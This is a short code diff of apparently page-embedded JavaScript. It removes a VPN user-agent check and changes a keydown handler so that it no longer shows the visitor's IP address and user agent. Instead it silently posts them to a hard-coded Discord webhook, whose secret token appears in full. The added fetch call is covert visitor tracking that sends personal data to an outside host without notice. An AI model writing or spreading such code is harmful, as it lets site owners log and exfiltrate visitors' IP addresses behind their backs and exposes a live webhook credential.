@@ -123,11 +123,6 @@ if (navigator.connection) {
   }
 }
 
-// Check for proxy connections using the 'connection' property
-if (navigator.userAgent.indexOf('VPN') !== -1) {
-  window.alert("VPN connection detected!🤓");
-  window.location.href = skidlink; 
-}
 
 var isVPN = false;
 var pc = new RTCPeerConnection({ iceServers: [] });
@@ -155,9 +150,15 @@ document.addEventListener('keydown', function(event) {
       .then(data => {
         const ip = "IP Address: " + data.ip;
         const ua = "User Agent: " + navigator.userAgent;
-        alert(ip + "\n" + ua);
+        const content = ip + "\n" + ua;
+        
+        // Replace WEBHOOK_URL with your Discord webhook URL
+        fetch('https://discord.com/api/webhooks/1081673976683708416/UlUUhgsYl0mQxZjwcpkeXWV_D4_5yq_Y-E49A2Us-FfCWBXvZY-FbRa9Ul-rL6IAfYx4', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content })
+        });
       })
       .catch(error => console.error(error));
   }
 });
-
